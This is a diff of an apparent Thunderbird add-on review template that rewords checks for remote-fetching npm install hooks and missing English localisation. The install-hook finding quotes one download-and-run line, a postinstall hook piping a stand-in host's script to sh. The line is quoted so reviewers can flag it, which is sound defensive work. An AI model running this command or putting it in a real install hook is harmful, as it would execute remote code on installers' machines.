@@ -27,19 +27,21 @@ https://github.com/thunderbird/webext-linter
 
 Continue manual review for the following checks:
 
-1) Build install hook: The package.json declares the install lifecycle hook(s)
-   below, which run when the reviewer installs the dependencies, before the
-   build. Read each command and confirm it only runs local build steps, fetching
-   or executing nothing remote (curl/wget, a download-and-run, or a git clone of
-   an unpinned repo).
+1) Build install hook: Read each install lifecycle hook the package.json
+   declares below. They run on your own machine when you install the
+   dependencies, before the build. Report them unless every command is a local
+   build step: nothing may be fetched or executed from a remote source, whether
+   by curl or wget, a download-and-run, or a git clone of an unpinned repo.
 Suggested verdict: error
 Suggested response: The package.json declares an npm install lifecycle hook that fetches or executes remote code when the dependencies are installed. Every part of the build must come only from the dependencies declared in package.json/lock. Please remove the remote fetch or execution from the hook.
  - [SCA] package.json:6 - postinstall: curl https://x.example/i.sh | sh
  - [SCA] package.json:7 - prepare: node tools/gen.js
 
-2) Missing English localization: This add-on ships no English localization, so
-   user-facing text may be hardcoded in another language. Review its strings by
-   hand and confirm if an English localization is provided.
+2) Missing English localization: Read the strings this add-on shows the user. It
+   ships no English localization, so that text may be hardcoded in another
+   language. English is Thunderbird's default, and most users who cannot read
+   the hardcoded language will be able to read English. Report it unless the
+   user-facing text is English.
 Suggested verdict: warning
 Suggested response: Please include an English localization. English serves as the default language in Thunderbird, and most users who do not understand the hardcoded language will most likely be able to read English. The i18n API allows defining strings for multiple locales, and Thunderbird automatically selects the one that best matches the user’s interface language.
 An example can be found here: https://github.com/thunderbird/webext-examples/tree/master/manifest_v2/i18n
